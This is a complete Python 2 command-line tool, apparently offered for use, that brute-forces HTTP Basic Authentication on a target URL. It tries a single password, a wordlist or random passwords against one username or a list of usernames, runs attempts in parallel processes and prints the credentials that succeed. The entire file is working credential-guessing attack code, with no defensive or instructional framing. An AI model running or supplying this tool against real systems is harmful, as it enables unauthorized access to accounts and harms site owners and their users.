#!/usr/bin/python

from requests.auth import HTTPBasicAuth
from termcolor import colored
import multiprocessing
import requests
import optparse
import random
import string
import sys

users = []

def Banner():
	print "\t____________________        _____          __  .__     "
	print "\t\______   \______   \      /  _  \  __ ___/  |_|  |__  "
	print "\t |    |  _/|    |  _/     /  /_\  \|  |  \   __\  |  \ "
	print "\t |    |   \|    |   \    /    |    \  |  /|  | |   Y  \ "
	print "\t |______  /|______  /____\____|__  /____/ |__| |___|  /"
	print "\t 	\/       \/_____/        \/                 \/\n"
	print "\t\t\t  Coded By Zer0C0de" 

def brute(web,user,wordlist):
	print colored("\n +---------  [+] User: "+user+" +---------\n","cyan")
	try:
		f = open(words,'r')
		for w in f:
			w = w.strip('\n')
			check = requests.get(web, auth=HTTPBasicAuth(user, w))
			r = check.status_code
			if r == 200:
				print colored("\n\t! [*] Success: "+user+":"+w+" !\n","green")
			elif r == 401:
				print colored("[-] Failed: "+user+":"+w+" ","red")
	except IOError:
		Banner()
		print colored("[-] Unable to load file","red")
		sys.exit()

def test_login(web,user,pw):
	check = requests.get(web, auth=HTTPBasicAuth(user, pw))
	r = check.status_code
	if r == 200:
		print colored("\n\t! [*] Success: "+user+":"+pw+" !\n","green")
	elif r == 401:
		print colored("[-] Failed: "+user+":"+pw+" ","red")

def random_pw(length):
	return ''.join(random.choice(string.ascii_letters + string.digits) for x in range(length))

parser = optparse.OptionParser()

parser.add_option("--target",dest="web",help="The target")
parser.add_option("--user",dest="usr",help="The username to brute")
parser.add_option("--user-list",dest="user_lst",help="The username list")
parser.add_option("--wordlist",dest="wlist",help="The list of words")
parser.add_option("--password",dest="pwd",help="The password to try")
parser.add_option("--random-password",dest="rnd_pw",type='int',help="Use random password (give a length)",)
(options, args) = parser.parse_args()

host = options.web
words = options.wlist
user = options.usr
randompw = options.rnd_pw

if (host == None):
	print parser.usage
	sys.exit()
if options.user_lst and options.pwd:
	try:
		c = open(options.user_lst,'r')
		for x in c:
			if x == "\n":
				pass
			else:
				users.append(x)
	except IOError:
		Banner()
		print colored("[-] Unable to load file","red")
		sys.exit()
	Banner()
	print colored("\n  [+] Web: "+host,"cyan")
	for u in users:
		u = u.strip('\n')
		mp = multiprocessing.Process(target=test_login, args=(host,u,options.pwd,))
		mp.start()
	sys.exit()
if options.user_lst and options.rnd_pw:
	try:
		c = open(options.user_lst,'r')
		for x in c:
			if x == "\n":
				pass
			else:
				users.append(x)
	except IOError:
		print colored("[-] Unable to load file","red")
		sys.exit()
	Banner()
	print colored("\n  [+] Web: "+host,"cyan")
	print colored("  [+] User List: "+options.user_lst+"\n","cyan")
	for u in users:
		u = u.strip('\n')
		mp = multiprocessing.Process(target=test_login, args=(host,u,random_pw(randompw),))
		mp.start()
	sys.exit()
if options.rnd_pw and user:
	test_login(host,user,random_pw(randompw))
	sys.exit()
if options.pwd and user:
	test_login(host,user,options.pwd)
	sys.exit()
if user is not None:
	if user is not None:
		Banner()
		print colored("\n  [+] Web: "+host,"cyan")
		print colored("  [+] Wordlist: "+words+"\n","cyan")
		mp = multiprocessing.Process(target=brute, args=(host,user,words,))
		mp.start()
	else:
		pass
else:
	try:
		if options.user_lst:
			c = open(options.user_lst,'r')
			for x in c:
				if x == "\n":
					pass
				else:
					users.append(x)
	except IOError:
		Banner()
		print colored("[-] Unable to load file","red")
		sys.exit()
	Banner()
	print colored("\n  [+] Web: "+host,"cyan")
	print colored("  [+] Wordlist: "+words+"\n","cyan")
	for u in users:
		u = u.strip('\n')
		mp = multiprocessing.Process(target=brute, args=(host,u,words,))
		mp.start()